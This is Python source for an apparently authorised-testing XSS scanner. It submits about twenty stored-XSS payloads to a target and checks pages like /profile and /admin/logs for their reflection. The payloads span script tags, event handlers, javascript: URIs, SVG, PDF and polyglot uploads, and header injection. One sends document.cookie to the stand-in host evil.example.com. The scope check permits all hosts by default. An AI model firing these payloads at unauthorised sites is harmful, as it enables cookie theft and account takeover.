"""Automated XSS vulnerability detection engine.

Zero LLM cost -- pure deterministic HTTP testing.
Covers reflected, stored, DOM-based, and blind XSS across multiple injection
contexts (HTML body, attribute, JavaScript, URL, CSS) with WAF bypass variants.

Stored XSS detection uses two-phase testing: payloads are submitted via POST,
then trigger paths are crawled to detect reflected canaries in rendered output.
Payloads cover profile/registration fields, content submission, file-based
vectors, and admin panel persistence scenarios.

Key references:
- CWE-79 (Improper Neutralization of Input During Web Page Generation)
- OWASP XSS Prevention Cheat Sheet
- PortSwigger XSS Cheat Sheet (context-dependent payloads)
- HackerOne #470206 (Shopify stored XSS via SVG upload)
- HackerOne #148853 (Uber reflected XSS $3,000)
- HackerOne #298862 (Twitter stored XSS via filename)
- HackerOne #409850 (Yahoo stored XSS via EXIF metadata)
"""

from __future__ import annotations

import asyncio
import hashlib
import re
from typing import Any
from urllib.parse import urlparse

import httpx
import structlog

from ai_brain.active.deterministic_tools import _make_client
from ai_brain.active.scope_guard import ActiveScopeGuard

logger = structlog.get_logger()

# ── Module-level constants ────────────────────────────────────────────

_CANARY_PREFIX = "xSsC4n4ry"
_EVIL_DOMAIN = "evil.example.com"

_SUPPORTED_CONTEXTS = (
    "html_body",
    "html_attribute",
    "javascript",
    "url",
    "css",
)

# Trigger paths for stored XSS verification -- pages where stored
# content is commonly rendered back to the user or admin.
_TRIGGER_PATHS = [
    "/profile",
    "/account",
    "/settings",
    "/comments",
    "/admin/logs",
    "/dashboard",
]

# Patterns that indicate successful XSS reflection (compiled once).
_REFLECTION_PATTERNS: list[re.Pattern[str]] = [
    re.compile(p, re.IGNORECASE)
    for p in [
        r"<script[^>]*>.*?alert\(",
        r"onerror\s*=\s*['\"]?\s*alert\(",
        r"onload\s*=\s*['\"]?\s*alert\(",
        r"ontoggle\s*=\s*['\"]?\s*alert\(",
        r"javascript\s*:\s*alert\(",
        r"<svg[^>]*onload\s*=",
        r"<img[^>]*onerror\s*=",
        r"<details[^>]*ontoggle\s*=",
    ]
]


def _make_xss_client(socks_proxy: str | None = None) -> httpx.AsyncClient:
    """Create an httpx client for XSS testing (follows redirects)."""
    return _make_client(
        socks_proxy=socks_proxy,
        timeout=15,
        follow_redirects=True,
    )


class XSSAttackEngine:
    """Automated XSS vulnerability detection. $0 LLM cost.

    Tests reflected, stored, DOM-based, and blind XSS payloads across
    HTML body, attribute, JavaScript, URL, and CSS injection contexts.
    Includes WAF bypass variants and canary-based reflection detection.
    """

    _SUPPORTED_CONTEXTS = _SUPPORTED_CONTEXTS

    def __init__(
        self,
        client: httpx.AsyncClient | None = None,
        rate_delay: float = 0.3,
        scope_domains: list[str] | None = None,
        scope_guard: ActiveScopeGuard | None = None,
        socks_proxy: str | None = None,
    ) -> None:
        self._client = client
        self._rate_delay = rate_delay
        self._scope_domains = scope_domains
        self._scope_guard = scope_guard
        self._socks_proxy = socks_proxy
        self._request_count = 0

    # ── Scope check ───────────────────────────────────────────────────

    def _in_scope(self, url: str) -> bool:
        """Check if a URL is in scope via scope_guard or domain whitelist."""
        if self._scope_guard:
            return self._scope_guard.is_in_scope(url)
        if self._scope_domains:
            parsed = urlparse(url)
            hostname = (parsed.hostname or "").lower().strip(".")
            return any(
                hostname == d or hostname.endswith("." + d)
                for d in self._scope_domains
            )
        # No scope constraints -- allow all (testing/development mode).
        return True

    # ── Rate-limited HTTP sender ──────────────────────────────────────

    async def _send(
        self, method: str, url: str, **kwargs: Any
    ) -> httpx.Response | None:
        """Send an HTTP request with rate limiting and error handling."""
        if not self._in_scope(url):
            logger.warning("xss_scope_violation", url=url[:120])
            return None
        self._request_count += 1
        await asyncio.sleep(self._rate_delay)
        try:
            if self._client:
                return await self._client.request(method, url, **kwargs)
            async with _make_xss_client(self._socks_proxy) as client:
                return await client.request(method, url, **kwargs)
        except Exception as e:
            logger.debug(
                "xss_request_error", url=url[:120], error=str(e)[:100],
            )
            return None

    # ── Finding builder ───────────────────────────────────────────────

    def _make_finding(
        self,
        *,
        technique: str,
        url: str,
        method: str,
        param: str,
        payload: str,
        description: str,
        injection_context: str = "",
        evidence: str = "",
        vulnerable: bool = True,
        extra: dict[str, Any] | None = None,
    ) -> dict[str, Any]:
        """Build a standardized finding dict."""
        finding: dict[str, Any] = {
            "technique": technique,
            "url": url,
            "method": method,
            "param": param,
            "payload": payload,
            "description": description,
            "injection_context": injection_context,
            "evidence": evidence,
            "vulnerable": vulnerable,
            "severity": self._classify_severity(technique),
            "dedup_hash": hashlib.sha256(
                f"{technique}:{url}:{param}:{payload}".encode()
            ).hexdigest()[:16],
        }
        if extra:
            finding.update(extra)
        return finding

    _HIGH_SEVERITY_TECHNIQUES = frozenset({"stored", "blind", "admin_persistence"})
    _MEDIUM_SEVERITY_TECHNIQUES = frozenset({"reflected", "dom_based"})

    @staticmethod
    def _classify_severity(technique: str) -> str:
        """Classify severity based on XSS technique."""
        if technique in XSSAttackEngine._HIGH_SEVERITY_TECHNIQUES:
            return "high"
        if technique in XSSAttackEngine._MEDIUM_SEVERITY_TECHNIQUES:
            return "medium"
        return "low"

    # ── Canary generation ─────────────────────────────────────────────

    @staticmethod
    def _generate_canary(index: int = 0) -> str:
        """Generate a unique canary string for reflection tracking."""
        return f"{_CANARY_PREFIX}{index:04d}"

    # ══════════════════════════════════════════════════════════════════
    # STORED XSS -- Full Implementation
    # ══════════════════════════════════════════════════════════════════

    def _build_stored_payloads(self) -> list[dict[str, Any]]:
        """Build ~20 stored XSS payloads across multiple injection vectors.

        Returns a list of payload dicts with keys:
            payload, description, context, technique
        """
        payloads: list[dict[str, Any]] = []

        # ── Profile / registration fields (6) ─────────────────────────

        payloads.append({
            "payload": "<img src=x onerror=alert(document.domain)>",
            "description": "Image onerror in profile name field",
            "context": "html_body",
            "technique": "profile_name",
        })
        payloads.append({
            "payload": '"><script>alert(1)</script>',
            "description": "Script injection breaking out of attribute in bio/about field",
            "context": "html_attribute",
            "technique": "profile_bio",
        })
        payloads.append({
            "payload": "<svg/onload=alert(1)>",
            "description": "SVG onload event in location field",
            "context": "html_body",
            "technique": "profile_location",
        })
        payloads.append({
            "payload": "javascript:alert(1)",
            "description": "JavaScript URI in website URL field",
            "context": "url",
            "technique": "profile_website",
        })
        payloads.append({
            "payload": "<details/open/ontoggle=alert(1)>",
            "description": "Details element ontoggle in description field",
            "context": "html_body",
            "technique": "profile_description",
        })
        payloads.append({
            "payload": '<math><mi/xlink:href="data:x,<script>alert(1)</script>">',
            "description": "MathML with xlink:href data URI for rich text fields",
            "context": "html_body",
            "technique": "profile_richtext",
        })

        # ── Content submission (5) ────────────────────────────────────

        payloads.append({
            "payload": "<script>alert(document.cookie)</script>",
            "description": "Classic script tag injection in comment field",
            "context": "html_body",
            "technique": "comment_script",
        })
        payloads.append({
            "payload": "[url]javascript:alert(1)[/url]",
            "description": "BBCode URL tag with javascript URI",
            "context": "url",
            "technique": "bbcode_url",
        })
        payloads.append({
            "payload": '<img src="x" onerror="alert(1)">',
            "description": "Image tag injection via markdown image syntax",
            "context": "html_body",
            "technique": "markdown_img",
        })
        payloads.append({
            "payload": "![alt](javascript:alert(1))",
            "description": "Markdown link with javascript URI",
            "context": "url",
            "technique": "markdown_link",
        })
        payloads.append({
            "payload": '<a href="data:text/html,<script>alert(1)</script>">click</a>',
            "description": "Anchor tag with data URI containing script in forum post",
            "context": "html_body",
            "technique": "forum_data_uri",
        })

        # ── File-based (5) ────────────────────────────────────────────

        payloads.append({
            "payload": 'filename="<img src=x onerror=alert(1)>.jpg"',
            "description": "XSS in uploaded filename reflected in file listing",
            "context": "html_attribute",
            "technique": "upload_filename",
        })
        payloads.append({
            "payload": (
                '<?xml version="1.0" encoding="UTF-8"?>'
                '<svg xmlns="http://www.w3.org/2000/svg">'
                "<script>alert(document.domain)</script>"
                "</svg>"
            ),
            "description": "SVG file upload with embedded script tag",
            "context": "html_body",
            "technique": "upload_svg",
        })
        payloads.append({
            "payload": (
                "GIF89a/*<svg/onload=alert(1)>*/"
            ),
            "description": "EXIF/image metadata with XSS payload (polyglot GIF header)",
            "context": "html_body",
            "technique": "upload_exif",
        })
        payloads.append({
            "payload": (
                '<html><body><script>alert(document.cookie)</script></body></html>'
            ),
            "description": "HTML file upload served with wrong content-type (type confusion)",
            "context": "html_body",
            "technique": "upload_html_type_confusion",
        })
        payloads.append({
            "payload": (
                "%PDF-1.4\n1 0 obj<</Type/Catalog/Pages 2 0 R/"
                "OpenAction<</S/JavaScript/JS(alert(1))>>>>"
            ),
            "description": "PDF FormCalc XSS when rendered inline by browser",
            "context": "javascript",
            "technique": "upload_pdf_formcalc",
        })

        # ── Admin panel persistence (4) ───────────────────────────────

        payloads.append({
            "payload": (
                f"<script>fetch('https://{_EVIL_DOMAIN}/'"
                "+document.cookie)</script>"
            ),
            "description": "Log poisoning: script tag in logged field exfiltrates admin cookies",
            "context": "html_body",
            "technique": "log_poisoning",
        })
        payloads.append({
            "payload": "<img src=x onerror=alert(1)>",
            "description": "User-Agent header stored in admin access logs",
            "context": "html_body",
            "technique": "useragent_log",
        })
        payloads.append({
            "payload": "<svg onload=alert(1)>",
            "description": "Error message stored and rendered in admin error log view",
            "context": "html_body",
            "technique": "error_message_stored",
        })
        payloads.append({
            "payload": "<img src=x onerror=alert(document.domain)>",
            "description": "Referer header XSS in analytics/referral dashboard",
            "context": "html_body",
            "technique": "referer_analytics",
        })

        return payloads

    async def test_stored_xss(
        self,
        url: str,
        method: str,
        param: str,
        params: dict[str, str] | None = None,
    ) -> list[dict[str, Any]]:
        """Test stored XSS via two-phase detection.

        Phase 1: Submit payload via POST to the target endpoint.
        Phase 2: Crawl trigger paths to detect canary/payload reflection.

        Args:
            url: Target URL to submit payloads to.
            method: HTTP method (typically POST for stored XSS).
            param: Parameter name to inject into.
            params: Additional parameters to include in the request.

        Returns:
            List of finding dicts for confirmed stored XSS.
        """
        findings: list[dict[str, Any]] = []
        all_payloads = self._build_stored_payloads()
        base_params = dict(params or {})
        parsed = urlparse(url)
        base_url = f"{parsed.scheme}://{parsed.netloc}"

        # Collect baseline content from trigger paths before injection.
        baseline_bodies: dict[str, str] = {}
        for trigger_path in _TRIGGER_PATHS:
            trigger_url = f"{base_url}{trigger_path}"
            if not self._in_scope(trigger_url):
                continue
            resp = await self._send("GET", trigger_url)
            if resp is not None:
                baseline_bodies[trigger_path] = resp.text

        for payload_info in all_payloads:
            payload = payload_info["payload"]
            inject_params = {**base_params, param: payload}

            # Phase 1: Submit the payload (store it).
            if method.upper() == "GET":
                resp = await self._send("GET", url, params=inject_params)
            else:
                resp = await self._send("POST", url, data=inject_params)

            if resp is None:
                continue

            # Also inject via headers for admin log payloads.
            if payload_info["technique"] in (
                "useragent_log",
                "referer_analytics",
            ):
                header_name = (
                    "User-Agent"
                    if payload_info["technique"] == "useragent_log"
                    else "Referer"
                )
                await self._send(
                    "GET",
                    url,
                    headers={header_name: payload},
                )
                # Continue regardless -- the header payload may have been logged.

            # Phase 2: Check trigger paths for payload reflection.
            for trigger_path in _TRIGGER_PATHS:
                trigger_url = f"{base_url}{trigger_path}"
                if not self._in_scope(trigger_url):
                    continue

                trigger_resp = await self._send("GET", trigger_url)
                if trigger_resp is None:
                    continue

                body = trigger_resp.text

                # Check for raw payload reflection in response body.
                reflected = self._check_reflection(payload, body)
                if not reflected:
                    continue

                # Verify this reflection was not present in the baseline.
                baseline = baseline_bodies.get(trigger_path, "")
                if self._check_reflection(payload, baseline):
                    continue

                findings.append(self._make_finding(
                    technique="stored",
                    url=url,
                    method=method,
                    param=param,
                    payload=payload,
                    description=(
                        f"Stored XSS: payload submitted via {param}, "
                        f"reflected on {trigger_path}. "
                        f"{payload_info['description']}"
                    ),
                    injection_context="stored",
                    evidence=self._extract_evidence(payload, body),
                    extra={
                        "trigger_url": trigger_url,
                        "trigger_path": trigger_path,
                        "xss_context": payload_info["context"],
                        "xss_technique": payload_info["technique"],
                    },
                ))
                # One trigger path per payload is sufficient.
                break

        return findings

    @staticmethod
    def _check_reflection(payload: str, body: str) -> bool:
        """Check whether a payload is reflected in the response body.

        Checks for exact payload match and also for event-handler patterns
        that indicate unescaped reflection.
        """
        if not body:
            return False
        # Exact payload string present in body.
        if payload in body:
            return True
        # Check common XSS event handler patterns.
        for pat in _REFLECTION_PATTERNS:
            if pat.search(body):
                return True
        return False

    @staticmethod
    def _extract_evidence(payload: str, body: str, context_chars: int = 120) -> str:
        """Extract a snippet of the response body around the reflected payload."""
        idx = body.find(payload)
        if idx == -1:
            return ""
        start = max(0, idx - context_chars)
        end = min(len(body), idx + len(payload) + context_chars)
        return body[start:end]

    # ══════════════════════════════════════════════════════════════════
    # REFLECTED XSS -- Stub
    # ══════════════════════════════════════════════════════════════════

    def _build_reflected_payloads(self) -> list[dict[str, Any]]:
        """Build reflected XSS payloads. (Stub -- implemented by another unit.)"""
        return []

    async def test_reflected_xss(
        self,
        url: str,
        method: str = "GET",
        param: str | None = None,
        params: dict[str, str] | None = None,
    ) -> list[dict[str, Any]]:
        """Test reflected XSS. (Stub -- implemented by another unit.)"""
        return []

    # ══════════════════════════════════════════════════════════════════
    # DOM-BASED XSS -- Stub
    # ══════════════════════════════════════════════════════════════════

    def _build_dom_payloads(self) -> list[dict[str, Any]]:
        """Build DOM-based XSS payloads. (Stub -- implemented by another unit.)"""
        return []

    async def test_dom_xss(
        self,
        url: str,
        method: str = "GET",
        param: str | None = None,
        params: dict[str, str] | None = None,
    ) -> list[dict[str, Any]]:
        """Test DOM-based XSS. (Stub -- implemented by another unit.)"""
        return []

    # ══════════════════════════════════════════════════════════════════
    # BLIND XSS -- Stub
    # ══════════════════════════════════════════════════════════════════

    def _build_blind_payloads(self) -> list[dict[str, Any]]:
        """Build blind XSS payloads. (Stub -- implemented by another unit.)"""
        return []

    async def test_blind_xss(
        self,
        url: str,
        method: str = "GET",
        param: str | None = None,
        params: dict[str, str] | None = None,
    ) -> list[dict[str, Any]]:
        """Test blind XSS. (Stub -- implemented by another unit.)"""
        return []

    # ══════════════════════════════════════════════════════════════════
    # CONTEXT-SPECIFIC XSS -- Stub
    # ══════════════════════════════════════════════════════════════════

    def _build_context_payloads(
        self, context: str = "html_body",
    ) -> list[dict[str, Any]]:
        """Build context-specific payloads. (Stub -- implemented by another unit.)"""
        return []

    async def test_context_xss(
        self,
        url: str,
        method: str = "GET",
        param: str | None = None,
        params: dict[str, str] | None = None,
        context: str = "html_body",
    ) -> list[dict[str, Any]]:
        """Test context-specific XSS. (Stub -- implemented by another unit.)"""
        return []

    # ══════════════════════════════════════════════════════════════════
    # WAF BYPASS XSS -- Stub
    # ══════════════════════════════════════════════════════════════════

    def _build_waf_bypass_payloads(self) -> list[dict[str, Any]]:
        """Build WAF bypass XSS payloads. (Stub -- implemented by another unit.)"""
        return []

    async def test_waf_bypass_xss(
        self,
        url: str,
        method: str = "GET",
        param: str | None = None,
        params: dict[str, str] | None = None,
    ) -> list[dict[str, Any]]:
        """Test WAF bypass XSS. (Stub -- implemented by another unit.)"""
        return []

    # ══════════════════════════════════════════════════════════════════
    # POLYGLOT XSS -- Stub
    # ══════════════════════════════════════════════════════════════════

    def _build_polyglot_payloads(self) -> list[dict[str, Any]]:
        """Build polyglot XSS payloads. (Stub -- implemented by another unit.)"""
        return []

    async def test_polyglot_xss(
        self,
        url: str,
        method: str = "GET",
        param: str | None = None,
        params: dict[str, str] | None = None,
    ) -> list[dict[str, Any]]:
        """Test polyglot XSS. (Stub -- implemented by another unit.)"""
        return []

    # ══════════════════════════════════════════════════════════════════
    # FULL SCAN -- Stub
    # ══════════════════════════════════════════════════════════════════

    async def run_full_scan(
        self,
        url: str,
        method: str = "GET",
        param: str | None = None,
        params: dict[str, str] | None = None,
    ) -> list[dict[str, Any]]:
        """Run all XSS test categories. (Stub -- implemented by another unit.)"""
        return []
